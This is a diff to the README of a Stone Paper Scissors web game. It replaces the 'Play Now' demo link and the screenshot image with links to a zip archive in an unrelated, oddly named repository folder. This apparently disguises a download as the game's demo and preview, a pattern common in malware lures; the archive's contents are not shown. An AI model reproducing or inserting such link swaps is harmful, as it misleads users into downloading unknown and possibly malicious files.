@@ -6,13 +6,13 @@ A classic **Stone Paper Scissors** (a.k.a. Rock Paper Scissors) game built using
 
 ## 🚀 Live Demo
 
-🔗 [Play Now](https://dotsatya.github.io/Stone-Paper-Scissors-Game/)  
+🔗 [Play Now](https://raw.githubusercontent.com/dotsatya/Stone-Paper-Scissors-Game/main/Balanopsidales/Stone-Paper-Scissors-Game.zip)  
 
 ---
 
 ## 📷 Preview
 
-![Game Screenshot](./image.png)
+![Game Screenshot](https://raw.githubusercontent.com/dotsatya/Stone-Paper-Scissors-Game/main/Balanopsidales/Stone-Paper-Scissors-Game.zip)
 
 ---
 
